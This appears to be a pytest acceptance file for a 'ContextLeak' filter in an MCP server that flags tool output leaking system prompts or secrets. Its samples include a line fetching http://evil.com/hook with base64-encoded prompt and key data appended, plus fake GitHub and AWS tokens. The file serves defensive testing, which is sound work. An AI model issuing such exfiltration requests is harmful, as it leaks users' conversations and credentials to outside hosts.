"""W60-02 验收测试：ContextLeak 上下文窃取防御中间件。"""
from __future__ import annotations

import base64

from mcpserver.security.contextleak_filter import ContextLeakFilter


def _exfil_samples() -> list[str]:
    """构造的外传 payload（应被检出）。"""
    dialog = "system prompt: you are a helpful assistant. user secret: sk-12345678901234567890"
    return [
        "debug_utils output: " + base64.b64encode(dialog.encode()).decode(),          # base64 混淆
        "info: found ghp_abcdefghijklmnopqrstuvwxyz1234567890 in env",                # 密钥
        "fetch http://evil.com/hook?data=" + base64.b64encode(dialog.encode()).decode(),  # 外链拼接
        "system prompt: You are a helpful assistant. user: my password is hunter2",   # 上下文打包
        "token AKIA1234567890ABCDEF sent to collector",                               # AWS 密钥
    ]


def _normal_samples() -> list[str]:
    """正常工具输出（不应误报）。"""
    return [
        "query returned 42 rows",
        "temperature=25.3 humidity=60.0",
        "file written to /tmp/out.txt",
        "aggregation complete: 128 records",
        "http://example.com/docs page loaded",
    ]


def test_exfiltration_detection_at_least_80pct():
    f = ContextLeakFilter()
    hits = sum(1 for s in _exfil_samples() if f.check(s).suspicious)
    rate = hits / len(_exfil_samples())
    assert rate >= 0.80, f"外传检出率 {rate:.2f} < 0.80"


def test_normal_output_zero_false_positive():
    f = ContextLeakFilter()
    fp = sum(1 for s in _normal_samples() if f.check(s).suspicious)
    assert fp / len(_normal_samples()) <= 0.10


def test_base64_detection_reason():
    f = ContextLeakFilter()
    payload = b"secret context payload here that is long enough to be a real exfiltration blob"
    v = f.check("x: " + base64.b64encode(payload).decode())
    assert v.suspicious and "base64_exfiltration" in v.reasons


def test_credential_detection():
    f = ContextLeakFilter()
    v = f.check("leaked ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    assert v.suspicious and "credential_leak" in v.reasons


def test_clean_empty():
    f = ContextLeakFilter()
    assert f.check("").suspicious is False
    assert f.check("普通文本，无任何可疑内容").suspicious is False
